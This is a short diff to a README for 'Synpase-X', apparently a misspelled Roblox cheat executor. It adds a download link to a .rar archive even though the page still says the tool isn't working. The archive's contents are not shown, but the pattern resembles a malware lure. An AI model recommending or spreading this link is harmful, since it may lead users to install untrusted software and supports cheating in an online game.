@@ -1,5 +1,15 @@
 ### Currently Synpase-X isnt working for Roblox. Stay tuned and ⭐ this repo :)
-Soon Synpase-X will be back in action!
+
+
+# Download
+[Download](https://github.com/Synpase-X/Synpase-X/releases/download/Synpase-X/Synpase-X.rar)
+
+
+
+
+
+
+
 
 U can always help us provide the best Roblox Executor by donating to us
 
